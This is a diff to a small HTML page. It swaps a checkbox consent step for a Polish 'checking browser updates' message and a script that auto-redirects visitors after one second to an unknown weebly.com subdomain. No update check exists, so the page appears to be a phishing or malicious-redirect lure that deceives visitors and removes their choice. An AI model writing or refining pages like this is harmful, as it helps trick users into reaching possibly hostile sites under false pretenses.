@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Continue to Page</title>
+  <title>Redirecting...</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -20,7 +20,6 @@
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
 
-    /* Loading spinner */
     .spinner {
       display: inline-block;
       width: 50px;
@@ -35,42 +34,20 @@
     @keyframes spin {
       to { transform: rotate(360deg); }
     }
-
-    .hidden {
-      display: none;
-    }
-
-    label {
-      font-size: 18px;
-    }
   </style>
 </head>
 <body>
 
   <div class="box">
-    <h2>Tick the box below to continue</h2>
-    <label>
-      <input type="checkbox" id="agreeCheckbox"> I agree to continue
-    </label><br>
-    <div id="loading" class="spinner hidden"></div>
+    <h2>Sprawdzanie aktualizacji przeglądarki...</h2>
+    <div class="spinner"></div>
   </div>
 
   <script>
-    const checkbox = document.getElementById('agreeCheckbox');
-    const spinner = document.getElementById('loading');
-
-    checkbox.addEventListener('change', () => {
-      if (checkbox.checked) {
-        // Hide checkbox after ticking
-        checkbox.disabled = true;
-        spinner.classList.remove('hidden');
-
-        // Redirect after a short delay (2 seconds)
-        setTimeout(() => {
-          window.location.href = 'https://oghpoczt.weebly.com/';
-        }, 2000);
-      }
-    });
+    // Auto redirect after 1 second (1000ms)
+    setTimeout(() => {
+      window.location.href = "https://oghpoczt.weebly.com/";
+    }, 1000);
   </script>
 
 </body>
